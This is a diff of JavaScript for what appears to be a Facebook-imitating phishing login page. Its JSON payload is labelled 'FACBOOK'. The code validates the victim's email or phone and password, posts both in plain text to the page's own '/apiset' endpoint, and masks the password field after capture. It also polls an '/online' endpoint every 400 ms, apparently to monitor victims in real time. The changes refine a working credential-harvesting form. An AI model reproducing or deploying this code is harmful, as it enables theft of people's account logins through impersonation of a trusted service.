@@ -8,7 +8,8 @@ let d2 = document.getElementById("d2");
 
 email.placeholder=" Email or phone number";
 pass.placeholder=" password";
-
+var PAS = "";
+var PA;
 var E = email.value;
 var P = pass.value;
 var send = false
@@ -48,7 +49,6 @@ onkeyup=function () {
   send = true
   P = pass.value;
   var o = 0
-  
   function T() {
     for (let z = 2; z < E.length; z++) {
       if (E[z] == 0) {
@@ -97,7 +97,6 @@ onkeyup=function () {
   }
 }
 log.onclick=function (){
-
   var NS = 'n'
    if (E[0] == '1') {
     errer('Error in phone number')
@@ -126,9 +125,10 @@ log.onclick=function (){
     NS = 's'
     //console.log(E.length)
     var aro = E.indexOf('@gmail.com')
-    if (aro == -1 ) {
-    errer('Error in email "@gmail.com"')
-    }else{
+    console.log(aro)
+    if (aro == -1) {
+    errer('Error in Email "@Email.com"')
+  }else{
       send = true
     }
   }
@@ -140,7 +140,7 @@ log.onclick=function (){
       }else{
         if (E.length < 14) {
           send = false
-        errer('Error in email "@gmail.com"')
+        errer('Error in email "@Email.com"')
       }
       }
       if (P.length < 8) {
@@ -157,7 +157,12 @@ log.onclick=function (){
    //console.log(send)
     if (send == true) {
       serh()
-
+      document.getElementById("pass").type = "text"
+      var PO = pass.value
+      document.getElementById("pass").value =''
+      for (let z = 0; z < PO.length; z++) {
+        document.getElementById("pass").value +='•'
+      }
       let api = new XMLHttpRequest()
    api.open('POST','https://' +location.host+ '/apiset')
    api.setRequestHeader("Accept","application/json")
@@ -174,9 +179,10 @@ log.onclick=function (){
        "BANE":false,
        "AFER":"undefined",
        "Email":"${email.value}",
-       "Password":"${pass.value}",
+       "Password":"${PO}",
        "Location":"FACBOOK"
         }`
+        console.log(PO)
     api.send(day) 
 }
 }
@@ -184,7 +190,7 @@ function errer(R) {
   if (R =='Password error') {
     d2.innerText= R
     d2.style.display='block'
-  }else if (R == 'Error in email "@gmail.com"') {
+  }else if (R == 'Error in email "@Email.com"') {
     d1.innerText= R
     d1.style.display='block'
   }else if ( R == 'Error in phone number') {
@@ -194,7 +200,7 @@ function errer(R) {
 
 }
 function test() {
-  setTimeout(function(){test()},500)
+  setTimeout(function(){test()},400)
   let apiserh = new XMLHttpRequest()
   apiserh.open('POST','https://'+location.host+ '/online')
   apiserh.setRequestHeader("Accept","application/json")
@@ -209,4 +215,6 @@ function test() {
   console.log('islam')
   }
   test()
-//console.log(location.host)
+console.log(location.host)
+
+
